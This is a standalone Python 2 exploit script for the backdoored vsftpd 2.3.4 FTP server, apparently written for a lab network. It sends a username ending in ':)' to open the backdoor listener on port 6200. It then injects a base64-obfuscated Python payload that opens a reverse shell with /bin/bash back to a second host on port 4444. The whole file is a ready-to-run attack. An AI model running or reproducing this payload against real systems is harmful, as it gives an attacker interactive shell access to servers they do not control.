#!/usr/bin/python

import random
import string
import socket

#--FUNCTIONS-----------------------------------------------------------------------------
    
#random string
def random_key(length):
    key = ''
    for i in range(length):
        key += random.choice(string.lowercase + string.uppercase + string.digits)
    return key

#----------------------------------------------------------------------------------------

#Parameters
RHOST="192.168.64.133"
RPORT=21
BACKDOOR=6200

try:
    print ('Ckecking BACKDOOR ...')
    checkb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    checkb.connect((RHOST, BACKDOOR))
    print "The port used by the backdoor bind listener is already open"
    checkb.close()

except socket.error as e:
    #print "Backdoor in Port", BACKDOOR, "Closed", "-", e
    checkb.close

try:
    #getting Banner
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    banner=s.recv(512)
    print "Banner:", banner

except socket.error as e:
    print e

try:
    #sending a random USER and PASS
    s.send(str("USER " + random_key(6) + ":)\r\n"))
    resp = s.recv(3)

    if resp != '331':
        print "This server did not respond as expected"
        s.close()

    s.send(str("PASS " + random_key(6) + "\r\n"))

except socket.error as e:
    print e

try:
    #checking if backdoor port is now open
    checkb2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    checkb2.settimeout(2)  
    checkb2.connect((RHOST, BACKDOOR))
    print "The port used by the backdoor bind listener is now open."

    #sending shell    
    shell = "python -c \"exec('aW1wb3J0IHNvY2tldCAgICAgICwgICAgIHN1YnByb2Nlc3MgICAgICAsICAgICBvcyAgICAgICAgIDsgICAgICAgaG9zdD0iMTkyLjE2OC42NC4xMjgiICAgICAgICAgOyAgICAgICBwb3J0PTQ0NDQgICAgICAgICA7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgICA7ICAgICAgIHMuY29ubmVjdCgoaG9zdCAgICAgICwgICAgIHBvcnQpKSAgICAgICAgIDsgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgICAgMCkgICAgICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAgIDEpICAgICAgICAgOyAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgICAyKSAgICAgICAgIDsgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))\""
    print "Sending Shell..."
    checkb2.send(shell)
    print "Shell executed"
    checkb2.close

except socket.error as e:
    print "Backdoor in Port", BACKDOOR, "Closed", "-", e
    checkb2.close







